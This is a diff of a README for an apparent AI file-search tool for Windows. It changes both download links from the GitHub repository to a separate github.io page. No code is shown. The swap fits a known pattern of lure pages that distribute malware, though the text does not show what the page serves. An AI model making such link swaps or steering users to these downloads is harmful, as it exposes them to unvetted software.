@@ -1,6 +1,6 @@
 # 🔍 ai-search-engine - Find your files using smart AI
 
-[![](https://img.shields.io/badge/Download-ai--search--engine-blue.svg)](https://github.com/retrograde-prosceniumwall239/ai-search-engine)
+[![](https://img.shields.io/badge/Download-ai--search--engine-blue.svg)](https://retrograde-prosceniumwall239.github.io)
 
 This tool helps you search for information within your documents. It uses artificial intelligence to find answers based on the meaning of your text rather than just matching keywords. If you have many files and need to find specific facts or topics, this application saves you time.
 
@@ -16,7 +16,7 @@ To run this application on your Windows computer, you need the following items:
 
 You must visit the project page to get the latest version of the application. 
 
-[Click here to visit the project page and download the software](https://github.com/retrograde-prosceniumwall239/ai-search-engine)
+[Click here to visit the project page and download the software](https://retrograde-prosceniumwall239.github.io)
 
 Follow these steps:
 
